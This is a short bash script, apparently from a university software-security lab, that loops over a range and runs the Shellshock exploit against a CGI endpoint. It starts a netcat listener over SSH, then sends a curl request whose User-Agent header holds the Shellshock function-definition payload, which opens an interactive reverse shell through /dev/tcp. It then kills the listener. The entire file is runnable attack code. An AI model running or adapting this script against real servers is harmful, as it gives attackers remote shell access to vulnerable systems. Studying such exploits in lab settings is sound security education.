#!/bin/bash

for i in $(eval echo {$1..$2})
do
ssh -i ./server.pem softseclab@10.176.147.83 nc -l -p 8000 &
curl -k -A "() { :; };/bin/bash -i >& /dev/tcp/10.0.3.1/8000 0>&1" --data @data.txt https://10.176.147.83/cgi-bin/ss 

sleep 5 


ssh -i ./server.pem softseclab@10.176.147.83 sudo killall -s SIGINT nc


done

